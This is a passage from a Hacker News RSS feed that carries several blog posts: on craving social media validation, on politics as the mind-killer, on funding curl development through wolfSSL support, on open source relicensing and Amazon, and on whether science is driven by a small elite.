<p>This craving for validation starts from a young age. We learn to seek it. Constantly. At Home. At School. At the workplace.</p>
<p>We seek it from our Parents. Our siblings. Our Friends. Our Boss, Our Co-workers. Strangers on the internet.</p>
<p>This need for validation is an endless loop. The more we get it, the more we crave it.  It’s hacking our brains. And it has received a massive boost from online social networks.</p>
<p>We post a tweet, and start staring at the Notifications, waiting for that blue dot to appear. </p>
<p>Every time it’s delayed by seconds, we feel a little bit sad at not getting that fix right away. </p>
<p>Time it shows up, we feel validated for posting that tasty morsel of a sentence.</p>
<p>We feel heartbroken that not enough people have upvoted our product on Product Hunt</p>
<p>Why didn’t enough people vote on my Hacker News Post?(I launched a whole product around this need.)</p>
<p>We envy the Reddit Mods(nay Gods) who decide if people can see our post. </p>
<p>Constantly staring at the Follower count.</p>
<p>Mood going up and down along with the trend lines in the graph.</p>
<p>We are hooked.</p>
<p>PS: You can indulge my validation need :-) by following me on <a target="_blank" rel="noopener" href="https://twitter.com/harishkgarg">Twitter</a> where I share lot of the updates. If you want to receive an email alert when I write a new post, subscribe <a target="_blank" rel="noopener" href="https://marvelous-experimenter-4753.ck.page/f3e3f76dd0">here</a></p>

  </div></div>]]>
            </description>
            <link>https://harishgarg.com/writing/on-seeking-validation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788328</guid>
            <pubDate>Fri, 15 Jan 2021 08:22:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Politics is the Mind-Killer (2007)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788275">thread link</a>) | @sundarurfriend
<br/>
January 15, 2021 | https://www.readthesequences.com/Politics-Is-The-Mind-Killer | <a href="https://web.archive.org/web/*/https://www.readthesequences.com/Politics-Is-The-Mind-Killer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikitext">



<p> ❦
</p>
<p>People go funny in the head when talking about politics. The evolutionary reasons for this are so obvious as to be worth belaboring: In the ancestral environment, politics was a matter of life and death. And sex, and wealth, and allies, and reputation… When, today, you get into an argument about whether “we” ought to raise the minimum wage, you’re executing adaptations for an ancestral environment where being on the wrong side of the argument could get you killed. Being on the <em>right</em> side of the argument could let <em>you</em> kill your hated rival!
</p>
<p>If you want to make a point about science, or rationality, then my advice is to not choose a domain from <em>contemporary</em> politics if you can possibly avoid it. If your point is inherently about politics, then talk about Louis XVI during the French Revolution. Politics is an important domain to which we should individually apply our rationality—but it’s a terrible domain in which to <em>learn</em> rationality, or discuss rationality, unless all the discussants are already rational.
</p>
<p>Politics is an extension of war by other means. Arguments are soldiers. Once you know which side you’re on, you must support all arguments of that side, and attack all arguments that appear to favor the enemy side; otherwise it’s like stabbing your soldiers in the back—providing aid and comfort to the enemy. People who would be level-headed about evenhandedly weighing all sides of an issue in their professional life as scientists, can suddenly turn into slogan-chanting zombies when there’s a <a href="https://www.readthesequences.com/A-Fable-Of-Science-And-Politics">Blue or Green</a> position on an issue.
</p>
<p>In Artificial Intelligence, and particularly in the domain of nonmonotonic reasoning, there’s a standard problem: “All Quakers are pacifists. All Republicans are not pacifists. Nixon is a Quaker and a Republican. Is Nixon a pacifist?”
</p>
<p>What on Earth was the point of choosing this as an example? To rouse the political emotions of the readers and distract them from the main question? To make Republicans feel unwelcome in courses on Artificial Intelligence and discourage them from entering the field? (And no, I am not a Republican. Or a Democrat.)
</p>
<p>Why would anyone pick such a <em>distracting</em> example to illustrate nonmonotonic reasoning? Probably because the author just couldn’t resist getting in a good, solid dig at those hated Greens. It feels so <em>good</em> to get in a hearty punch, y’know, it’s like trying to resist a chocolate cookie.
</p>
<p>As with chocolate cookies, not everything that feels pleasurable is good for you.
</p>
<p>I’m not saying that I think we should be apolitical, or even that we should adopt Wikipedia’s ideal of the <a href="https://en.wikipedia.org/wiki/Wikipedia:Neutral_point_of_view" rel="nofollow">Neutral Point of View</a>. But try to resist getting in those good, solid digs if you can possibly avoid it. If your topic legitimately relates to attempts to ban evolution in school curricula, then go ahead and talk about it—but don’t blame it explicitly on the whole Republican Party; some of your readers may be Republicans, and they may feel that the problem is a few rogues, not the entire party. As with Wikipedia’s <span>npov</span>, it doesn’t matter whether (you think) the Republican Party really <em>is</em> at fault. It’s just better for the spiritual growth of the community to discuss the issue without invoking color politics.
</p>


</div></div>]]>
            </description>
            <link>https://www.readthesequences.com/Politics-Is-The-Mind-Killer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788275</guid>
            <pubDate>Fri, 15 Jan 2021 08:15:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Food on the table while giving away source code]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25788122">thread link</a>) | @nixcraft
<br/>
January 14, 2021 | https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I founded the curl project early 1998 but had already then been working on the code since <a href="https://daniel.haxx.se/blog/2021/01/03/age-is-just-a-number-or-two/" data-type="post" data-id="15434">November 1996</a>. The source code was always open, free and available to the world. The term “open source” actually wasn’t even coined until early 1998,  just weeks before curl was born.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png" alt="" width="125" height="108" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png 789w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-200x175.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-450x394.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-768x672.png 768w" sizes="(max-width: 125px) 100vw, 125px"></figure></div>



<p>In the beginning of course, the first few years or so, this project wasn’t seen or discovered by many and just grew slowly and silently in a dusty corner of the Internet.</p>



<p>Already when I shipped the first versions I wanted the code to be open and freely available. For years I had seen the cool free software put out the in the world by others and I wanted my work to help build this communal treasure trove.</p>



<h2>License</h2>



<p>When I started this journey I didn’t really know what I wanted with curl’s license and exactly what rights and freedoms I wanted to give away and it took a few years and attempts before it landed.</p>



<p>The early versions were <a href="https://opensource.org/licenses/GPL-2.0">GPL licensed</a>, but as I learned about resistance from proprietary companies and thought about it further, I changed the license to be more commercially friendly and to match my conviction better. I ended up with <a href="https://opensource.org/licenses/MIT">MIT</a> after a brief experimental time using <a href="https://opensource.org/licenses/MPL-1.1">MPL</a>. (It was easy to change the license back then because I owned all the copyrights at that point.)</p>



<p>To be exact: we actually have a <a href="https://curl.se/docs/copyright.html">slightly modified MIT license</a> with some very subtle differences. The reason for the changes have been forgotten and we didn’t get those commits logged in the “big transition” to Sourceforge that we did in late 1999…  The end result is that this is now often recognized as “the curl license”, even though it is in effect the MIT license.</p>



<p>The license says everyone can use the code for whatever purpose and nobody is required to ship any source code to anyone, but they cannot claim they wrote it themselves and the license/use of the code should be mentioned in documentation or another relevant location.</p>



<p>As licenses go, this has to be one of the most frictionless ones there is.</p>



<h2>Copyright</h2>



<p>Open source relies on a solid copyright law and the copyright owners of the code are the only ones who can license it away. For a long time I was the sole copyright owner in the project. But as I had decided to stick to the license, I saw no particular downsides with allowing code and contributors (of significant contributions) to retain their copyrights on the parts they brought. To not use that as a fence to make contributions harder.</p>



<p>Today, in early 2021, I count 1441 copyright strings in the curl source code git repository. 94.9% of them have my name.</p>



<p>I never liked how some projects require copyright assignments or license agreements etc to be able to submit code or patches. Partly because of the huge administrative burden it adds to the project, but also for the significant friction and barrier to entry they create for new contributors and the unbalance it creates; some get more rights than others. I’ve always worked on making it easy and smooth for newcomers to start contributing to curl. It doesn’t happen by accident.</p>



<h2>Spare time</h2>



<p>In many ways, running a spare time open source project is easy. You just need a steady income from a “real” job and sufficient spare time, and maybe a server to host stuff on for the online presence.</p>



<p>The challenge is of course to keep developing it, adding things people want, to help users with problems and to address issues timely. Especially if you happen to be lucky and the user amount increases and the project grows in popularity.</p>



<p>I ran curl as a spare time project for decades. Over the years it became more and more common that users who submitted bug reports or asked for help about things were actually doing that during their <em>paid</em> work hours because they used  curl in a commercial surrounding – which sometimes made the situation almost absurd. The ones who actually got paid to work with curl were asking the unpaid developers to help them out.</p>



<p>I changed employers several times. I started my own company and worked as my own boss for a while. I worked for Mozilla on network stuff in Firefox for five years. But curl remained a spare time project because I couldn’t figure out how to turn it into a job without risking the project or my economy.</p>



<h2>Earning a living</h2>



<p>For many years it was a pipe dream for me to be able to work on curl as a real job. But how do I actually take the step from a spare time project to doing it full time? I give away all the code for free, and it is a solid and reliable product.</p>



<div><figure><a href="https://www.wolfssl.com/"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png" alt="" width="186" height="144" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png 1011w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-200x155.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-450x348.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-768x594.png 768w" sizes="(max-width: 186px) 100vw, 186px"></a></figure></div>



<p>The initial seeds were planted when I met and got to know Larry (wolfSSL CEO) and some of the other good people at <a href="https://www.wolfssl.com/">wolfSSL</a> back in the early 2010s. This, because wolfSSL is a company that write open source libraries and offer commercial support for them – proving that it can work as a business model. Larry always told me he thought there was a possibility waiting here for me with curl.</p>



<p>Apart from the business angle, if I would be able to work more on curl it could really benefit the curl project, and then of course indirectly everyone who uses it.</p>



<p>It was still a step to take. When <a href="https://daniel.haxx.se/blog/2018/11/18/im-leaving-mozilla/" data-type="post" data-id="11748">I gave up on Mozilla</a> in 2018, it just took a little thinking before I decided to try it. <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">I joined wolfSSL</a> to work on curl full time. A dream came true and finally curl was not just something I did “on the side”. It only took 21 years from first curl release to reach that point…</p>



<p>I’m living the open source dream, working on the project I created myself.</p>



<h2>Food for free code</h2>



<p>We sell commercial support for curl and libcurl. Companies and users that need a helping hand or swift assistance with their problems can get it from us – and with me here I dare to claim that there’s no company anywhere else with the same ability. We can offload engineering teams with their curl issues. Up to 24/7 level!</p>



<p>We also offer custom curl development, debugging help, porting to new platforms and basically any other curl related activity you need. See more on the <a href="https://www.wolfssl.com/products/curl/">curl product page</a> on the wolfSSL site.</p>



<p>curl (mostly in the shape of libcurl) runs in <strong>ten billion installations</strong>: some five, six billion mobile phones and tablets – used by several of the most downloaded apps in existence, in virtually every website and Internet server. In a billion computer games, a billion Windows machines, half a billion TVs, half a billion game consoles and in a few hundred million cars… curl has been made to run on 82 operating systems on 22 CPU architectures. Very few software components can claim a wider use.</p>



<p><em>“Isn’t it easier to list companies that are <strong>not</strong> using curl?”</em></p>



<p>Wide use and being recognized does not bring food on the table. curl is also totally free to download, build and use. It is very solid and stable. It performs well, is documented, well tested and “battle hardened”. It “just works” for most users.</p>



<h2>Pay for support!</h2>



<p>How to convince companies that they should get a curl support contract with me?</p>



<p>Paying customers get to influence what I work on next. Not only distant road-mapping but also how to prioritize short term bug-fixes etc. We have a guaranteed response-time.</p>



<p>You get your issues first in line to get fixed. Customers also won’t risk getting their issues added the known bugs document and put in the attic to be forgotten. We can help customers make sure their application use libcurl correctly and in the best possible way.</p>



<p>I try to emphasize that by getting support from us, customers can  take away some of those tasks from their own engineers and because we are  faster and better on curl related issues, that is a pure net gain economically. For all of us.</p>



<p><strong>This is not an easy sell.</strong></p>



<p>Sure, curl is used by thousands of companies everywhere, but most of them do it because it’s free (in all meanings of the word), functional and available. There’s a real challenge in identifying those that actually use it enough and  value the functionality enough that they realize they want to improve their curl foo.</p>



<p>Most of our curl customers purchased support first when they faced a complicated issue or problem they couldn’t fix themselves –  this fact gives me this weird (to the wider curl community) incentive to <em>not</em> fix some problems too fast, because it then makes it work against my ability to gain new customers!</p>



<p>We need paying customers for this to be sustainable. When wolfSSL has a sustainable curl business, I get paid and the work I do in curl benefits all the curl users; paying as well as non-paying.</p>



<h2>Dual license</h2>



<p>There’s clearly business in releasing open source under a strong copyleft license such as GPL, and as long as you keep the copyrights, offer customers to purchase that same code under another more proprietary- friendly  license. The code is still open source and anyone doing totally open things can still use it freely and at no cost.</p>



<p>We’ve shipped <a href="https://curl.se/tiny/">tiny-curl</a> to the world licensed under GPLv3. Tiny-curl is a curl branch with a strong focus on the<em><strong> </strong></em><strong>tiny</strong> part: the idea is to provide a libcurl more suitable for smaller systems, the ones that can’t even run a full Linux but rather use an RTOS.</p>



<p>Consider it a sort of experiment. Are users interested in getting a smaller curl onto their products and are they interested in paying for licensing. So far, tiny-curl supports two separate RTOSes for which we haven’t ported the “normal” curl to.</p>



<h2>Keeping things separate</h2>



<p>Maybe you don’t realize this, but I work hard to keep separate things compartmentalized. I am not curl, curl is not wolfSSL and wolfSSL is not me.  But we  all overlap greatly!</p>



<figure><a href="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg" alt="" width="599" height="562"></a><figcaption>The Daniel + curl + wolfSSL trinity</figcaption></figure>



<p>I work for wolfSSL. I work on curl. wolfSSL offers commercial curl support.</p>



<h2>Reserved features</h2>



<p>One idea that we haven’t explored much yet is the ability to make and offer “reserved features” to paying customers only. This of course as another motivation for companies to become curl support customers.</p>



<p>Such reserved features would still have to be sensible for the curl project …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/">https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/</a></em></p>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788122</guid>
            <pubDate>Fri, 15 Jan 2021 07:49:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The problem with Amazon and Open Source isn’t Amazon (2019)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25787965">thread link</a>) | @pabs3
<br/>
January 14, 2021 | https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/ | <a href="https://web.archive.org/web/*/https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
          <p><strong> </strong> <time datetime="2019-06-07T12:23:10-07:00">June 07, 2019</time></p>
          
          
            <p> 




  5 minute read

</p>
          
        </header>
      

      <section itemprop="text">
        
        <figure>

<p><a href="https://www.flickr.com/photos/elainegreycats/5979877429/sizes/m/"><img src="https://live.staticflickr.com/6122/5979877429_6b7db5903a.jpg" alt="Wrong Way" width="500" height="333"></a>
</p><figcaption>‘Wrong Way’ by Elaine with Grey Cats on Flickr; CC-BY</figcaption></figure>

<p><em>Recently a friend wrote asking me “what’s up with Amazon and open source?” and “is there a chance these new licenses will be approved by OSI?” What follows is my reply.</em></p>

<hr>

<p>There’s been a rash of open source project relicensing happening the past few months, and in nearly every case the company making the licensing change is claiming that that they’re doing it to protect the project in question from Amazon.</p>

<p>That is a big steaming pile of bullshit.</p>

<p>First of all: There is absolutely <em>nothing</em> wrong with how Amazon is using these open source projects. They are operating completely and entirely within the bounds of the licenses of the projects. Fingers need to be wagged here, but not at Amazon.</p>

<p>These projects are not being relicensed to protect them from Amazon. Claiming that they are is at best naive and at worst wilfully lying. These companies are relicensing projects to cover for the fact that they are ignorant of how to run a successful business. They knowingly released their secret sauce under permissive licenses and have discovered that doing so means that competitors can create more compelling product offerings based upon the same technology. This is entirely in accordance not only with the licenses that these companies knowingly chose, but also with a competitive market. The only problem with this is that it came as a surprise to these “open source” companies and now they’re reacting poorly.</p>

<p>If these companies actually cared about the <em>projects</em>, they would have invested the resources to build stronger communities around them. They would have reached out to Amazon, encouraged them to contribute back to the projects, and helped them to do so. They would NOT have taken the few community contributions—and you will find that most of these projects do not have many contributions from outside of the originating company, showing how poorly they managed their communities—they would not have taken these contributions from community members and then locked them behind proprietary licenses, violating the trust of their community.</p>

<p>You will find that none of the companies that have relicensed their projects address any of these issues. They don’t discuss how they tried to engage Amazon in their communities, how their attempts fell on deaf ears or were rebuffed. They can’t do this because thus far there is no evidence to show they even tried. I know a lot of the <a href="https://aws.amazon.com/blogs/opensource/">open source leadership at Amazon</a>. They’re good people who care deeply about free and open source and who are working to do the right thing by all of the communities of the projects they build upon. They would have been very open to hearing how they could make a positive difference in those communities. They’re a relatively few people across a very large company, so it may have taken a bit more time to get those contribution balls rolling, but they would have worked very hard to do so…had they been approached.</p>

<p>So don’t fall into the trap of unquestionably believing the recent spate of anti-Amazon propaganda. It comes from, without exception, companies that simply do not appear to understand how to operate successful businesses. From what I can tell, they’ve received poor advice from their VCs. Not knowing any better, they understandably followed this advice and now they’re paying the price.</p>

<p>As far as whether there’s any chance these new licenses will be OSI approved, I answer a pretty definitive “no.” There are two reasons for this. First of all, these companies would have to <a href="https://opensource.org/approval">submit the licenses for review</a>. OSI does not just go looking for licenses to review. License creators must take the action to say, “Hey, this is a new license that we believe adheres to the <a href="https://opensource.org/osd-annotated">Open Source Definition</a>. It’s valuable to us and to the community that it be recognised as such. Could you please review it and confirm that?” So far only one company has tried that and they failed to get their license approved, because of the second reason…</p>

<p>In order to become OSI-approved, licenses must adhere to the <a href="https://opensource.org/osd-annotated">Open Source Definition (OSD)</a>. These new licenses do not. While the ways they diverge from the OSD are varied, the most common ones are that they violate either “6. No Discrimination Against Fields of Endeavor”, “8. License Must Not Be Specific to a Product”, “9. License Must Not Restrict Other Software”, or “10. License Must Be Technology-Neutral”.</p>

<p>#6 is the one most violated by these licenses. Restricting to non-commercial usage is fundamentally against the spirit of free and open source software. From the very beginning, Stallman himself was very emphatic that people be allowed to make money from free software. He and FOSS leaders after him realised that preventing people from making money from free and open source software will doom the movement. It is vitally important to FOSS that people be encouraged to use it in commercial and for-profit ventures. This will help foster the spread of FOSS. These licenses disregard both that and the benefit of this clause of the OSD to the whole of FOSS in preference to their own singular commercial needs.</p>

<p>In fact, the vibrant cloud-based and cloud-native environment within which most software companies operate now and which makes so much innovation possible (including that of these misled companies), exists because companies have released their technologies under OSI-approved licenses and have come together to collaborate on common and powerful tools. This is the culture that successful companies embrace. Even Microsoft, the former nemesis of free and open source, recognizes that this type of collaboration is critical to the continued growth and evolution of the company.</p>

<p>To be perfectly clear: There is nothing wrong with making money from software, FOSS or otherwise. Choosing to use a proprietary license for software is a valid business decision and one I support. Choosing to use an <a href="https://opensource.org/licenses">OSI-approved license</a> is an equally valid business decision and, again, one I support. However the license to choose for the software created by your company is just that: a <em>BUSINESS</em> decision.</p>

<p>There are many potential variables to consider and those variables will be different for each company, but “how will we make enough money from this to maintain and grow the company sustainably?” is one that is consistent across all of these decisions. If a company’s answer to that is, “we’ll just give away the software to bring in leads” but they don’t have a compelling enough commercial offering on top of that to convert those leads to sales, while their competitor converts those leads and more using the same technology, that is NOT the fault of open source software, licensing, or culture. That’s a company that doesn’t understand how to do business, and blaming Amazon isn’t going to change that.</p>

        
      </section>

      

      


      
  

    </div></div>]]>
            </description>
            <link>https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787965</guid>
            <pubDate>Fri, 15 Jan 2021 07:17:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Newton hypothesis; Is science done by a small elite?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25787745">thread link</a>) | @barry-cotter
<br/>
January 14, 2021 | https://nintil.com/newton-hypothesis | <a href="https://web.archive.org/web/*/https://nintil.com/newton-hypothesis">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In previous posts I <a href="https://nintil.com/hhmi-and-nih">said</a> that the extent to which "Fund people" works will depend on the distribution of scientific talent. Think about the following situation: Imagine that only a handful of scientists at every point in time are able to –if given the time and means–lead revolutions on par with the work of Darwin, Einstein, or Galileo (This is an extreme case admittedly because most of science does not look like this; most of science is more incremental and less memorable). I recently found two authors that believe something like this,</p>
<p>Braben, whose <a href="https://nintil.com/review-scientific-freedom">book</a> <em>Scientific Freedom</em> I reviewed says that even though most scientists could be the next Einstein if they tried, only a few will even try:</p>
<blockquote>
<p>It is possible that my message may be seen as elitist and of interest only to <strong>those very few scientists who might be putative members of a twenty - first century Planck Club</strong>. That interpretation would be wrong. One of the themes here is that almost every serious researcher is at some time in a career capable of taking those fateful steps that might lead to a great discovery or the creation of penetrating new insight. They might then need to draw on vast reserves of courage and determination, and perhaps also a little luck if they are to make progress. At any one time, of course, <strong>the proportion of researchers ready to seize that possibly once - in - a - lifetime opportunity will be very small</strong>, so if they are prevented from doing so the democratic pressure they can exert is insignifican't. [...] a properly constituted TR initiative should appeal to only a small number of scientists with radical thoughts on their minds. The challenge is to recognize them as there are millions of scientists, and one does not even know which haystack hides the needle. [...] <strong>Let us assume that there were about 300 transformative researchers — the extended membership of the Planck Club — during the twentieth century.</strong></p>
</blockquote>
<p>In physics, <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">Lee Smolin</a> is even more on the elitist side, with even fewer scientists in the revolutionaries' club:</p>
<blockquote>
<p>“But when it comes to theoretical physics, we are not talking about much money at all. Suppose that an agency or foundation decided to fully support <strong>all the visionaries</strong> who ignore the mainstream and follow their own ambitious programs to solve the problems of quantum gravity and quantum theory. <strong>We are talking about perhaps</strong> <strong>two dozen theorists</strong>. Supporting them fully would take a tiny fraction of any large nation’s budget for physics.”</p>
</blockquote>
<p>I think there is something to this view, and it is not incompatible with what I said in my last blogpost (That peer review can select the best work). In physics, there has been <a href="https://nintil.com/is-useful-physics-over/">no progress</a> in the <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">fundamentals</a> of the <a href="https://www.amazon.com/Lost-Math-Beauty-Physics-Astray/dp/0465094252/ref=tmm_hrd_swatch_0?_encoding=UTF8&amp;qid=1610576984&amp;sr=8-2">field</a> since the 70s, so one could argue that perhaps there are key assumptions that need to be thrown away, that there is a strong need for funding what to many physicists seem obviously wrong. In that case peer review may be stifling progress: physics could benefit from less clever math and more philosophical thought, going back to the mode of thinking of Einstein et al. as Smolin suggests. Braben does not oppose peer review in general, he argues that peer review will systematically underrate those coming up with paradigm-breaking ideas, and most of science is not that.</p>
<p>
[1]. Who are biology's geniuses? Darwin? Biology is probably less of a Kuhnian world than physics is, given that biology has fewer strong assumptions baked in that would have to be overthrown and thus count as a revolution
</p>
<p>In biology, in contrast with physics, whatever the current framework is (if any)<sup><a href="#sidenote-1">1</a></sup>, it continues to be extremely fruitful. If one takes <a href="https://www.nobelprize.org/uploads/2020/10/advanced-chemistryprize2020.pdf">CRISPR</a>, which has been arguably been a case of "good science", one can break it down into:</p>
<ol>
<li>
<p>Noticing that there are suspicious repetitive sequences in certain bacteria</p>
</li>
<li>
<p>Figuring out what those are for</p>
</li>
<li>
<p>Leveraging them into a tool for gene editing</p>
</li>
<li>
<p>Further improving CRISPR (e.g. Prime Editing)</p>
</li>
</ol>
<p>None of these examples of good science (Or perhaps engineering if you count the last 2) are paradigm shifts but without any doubt CRISPR has been highly useful and influential, both in academia, and soon in the clinic.</p>
<p>In <a href="https://d1wqtxts1xzle7.cloudfront.net/30686866/Ineq_Wikipedia.pdf?1361917900=&amp;response-content-disposition=inline%3B+filename%3DOn_the_inequality_of_contributions_to_Wi.pdf&amp;Expires=1610411522&amp;Signature=P7P2cCDnu6yNhrt1L64caVUnkBRb40qvLrCZnROjgKvsSB9IP2MavdPs86gdf6AQYNf0FPLRXnH1K-dza1dQ4mBrvhWyoAUAYMlx%7EMXivPNvU9HK%7En5l59Etl8afosE63Odc9gz5aMsWVEAZTkGfgV3peaiEbk7I%7EQfQGhLsAyvz5JXI5YBJHK8u1EWrDN9xnkgKpXavLnv0-L046CM-BJntNX2sMR6j60Lt1nnZ%7ELGYQtWsn0ixPMxhDoNzNcPRCz7y%7Ef5vUQG7KGqRt-xAG%7EOZAyM78RpSF2mp871PHkbf9w1bnojA-ibc8QlJRGtb00qDEEGLV8qi7Y0bQqimWQ__&amp;Key-Pair-Id=APKAJLOHF5GGSLRBV4ZA">wikipedia</a>, only a small fraction (10%) of the active users do most (90%) of the edits. Is science like this, or even more extreme? <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0101698">Ioannidis</a> et al. (2014) note there are 15M scientists that published anything in the 1996-2011 period, but only 1% that has published every single year in this period. This smaller 150k-strong group accounts for 40% of all papers and 87% of all papers with &gt;1000 citations.</p>
<p>Nobel Prize winner William Shockley published (<a href="https://ieeexplore.ieee.org/document/4056505">1957</a>) a paper measuring the distribution of productivity in an already high-performing environment: the Los Alamos Scientific Laboratory as well as the Brookhaven National Laboratory. Shockley finds a log-normally distribution of publications and patents: Most scientists publish very little and a progressively smaller count publish increasingly more.</p>
<p>There's the observation of Lotka's law (Yes, it's the same Lotka as in Lotka-Volterra) that says that the relative frequency of authors with a given number of publications follows a power law that scales with the square of the number of articles published; for example out of 100 scientists who publishes at least 1 article, only 1 will publish 10 articles. The precise exponent may vary by discipline (Pao, <a href="https://asistdl.onlinelibrary.wiley.com/doi/abs/10.1002/(SICI)1097-4571(198601)37:1%3C26::AID-ASI4%3E3.0.CO;2-Z">1985</a>), but each one does seem to follow the same pattern: A handful of people publish an overwhelming fraction of all the papers.</p>
<p>We could say "We only remember a handful of scientists that advanced modern physics, so that must imply you only need that handful". Back in the early 20th century, how many physicists did "useful" work that ended up leading to currently accepted and useful knowledge? Sure we remember Einstein, Planck, Hilbert, Lorentz, Mach, Poincaré, and Minkowski. But How many physicists total were there back then? Lotka's paper samples Auerbach's <em><a href="https://archive.org/details/geschichtstafel00auergoog">Geschichtstafeln der Physik</a></em> (1910) which compiles physicists the author considered sufficiently important. The book was published 5 years after Einstein's Annus Mirabilis and he's not yet cited there, Auerbach stops at the year 1900. Turns out there are more physicists than just the famous ones (Perhaps we are biased towards those that worked in one particular area that ended up changing the foundations of physics). For example we have <a href="https://en.wikipedia.org/wiki/Heinrich_Kayser">Heinrich Kayser</a> who did pioneering work on, and coined the expression, "adsorption". I bet you hadn't heard of him before. It wouldn't be enough to just count all the names in the <em>Geschichtstafeln</em> and then try to come up with a total count of physicists; even that book can be undercounting physicists that still contributed (For example, that were cited by the authors mentioned in the book). Fortunately now we have indices with journals and citations so we can truly take something closer to the entire population of scientists and explore in more detail the <em>Ortega hypothesis</em>.</p>

<blockquote>
<p>The Ortega hypothesis predicts that highly-cited papers and medium-cited (or lowly-cited) papers would equally refer to papers with a medium impact. The Newton hypothesis would be supported if the top-level research more frequently cites previously highly-cited work than that medium-level research cites highly-cited work. [From the Bornmann paper cited later]</p>
</blockquote>
<p>Or to state it in a more direct way: <em>Most science does not matter</em>, it is a small circle of elites of today that feeds into a small circle of elites in the future.</p>
<p>Cole &amp; Cole (<a href="https://science.sciencemag.org/content/178/4059/368.abstract">1972</a>) is the seminal examination of this question, which led to an entire literature around whether or not the Ortega hypothesis is true or not. They took the most cited paper from each of 84 physicists and looked at the work they cited. 60% of it was to researchers at "top nine" departments (Which comprise 21% of the entire population of physicists), 43% of citations were to researchers that themselves were highly (&gt;60) cited [in a given period of time], despite those being only 8% of all papers. 70% of citations were to researchers that have one or more honorific awards, despite them being 26% of all physicists.</p>
<p>They also replicated this in a larger sample, taking the top 10 papers most cited in <em>Physical Review</em>, they looked at the work cited by those; so take one of those papers, get all the cited authors, compute their total citations and see if this authors are disproportionately more cited than the average author; and they are. The same is true for not so highly cited papers, leading the authors to conclude that T<em>hese data offer further support for the hypothesis that even the producers of research of limited impact depend predominantly on the work produced by a relatively small elite.</em>. </p>
<blockquote>
<p>It seems, rather, that a relatively small number of physicists produce work that becomes the base for future discoveries in physics. We have found that even papers of relatively minor significance have used to a disproportionate degree the work of the eminent scientists.</p>
</blockquote>
<p>Nobel Prize winners, unsurprisingly are extremely well cited even before they get the award,</p>
<blockquote>
<p>The average number of citations in the 1961 SCI to the work of Nobel laureates (who won the prize in physics between 1955 and 1965) was 58, as compared with an average of 5.5 citations for other scientists. Only 1.08 percent of the quarter of a million scientists who appear in the 1961 SCI received 58 or more citations. We thought it possible that winning the prize might make a scientist more visible and lead to a greater number of postprize citations than the quality of his work warranted. We therefore divided the laureates into two groups: those who won the prize five or fewer years before 1961 and those who won it after that year. The 1957-1961 laureates were cited an average of 42 times in the 1961 SCI; the future prize winners (those winning the prize between 1961 and 1965), an average of 62 times. Since the prospective laureates were more often cited than the actual laureates, we concluded that the larger number of …</p></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nintil.com/newton-hypothesis">https://nintil.com/newton-hypothesis</a></em></p>]]>
            </description>
            <link>https://nintil.com/newton-hypothesis</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787745</guid>
            <pubDate>Fri, 15 Jan 2021 06:37:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Insurrections, Ancient and Modern (and Also Meet the Academicats)]]>
            </title>
            <description>
<![CDATA[
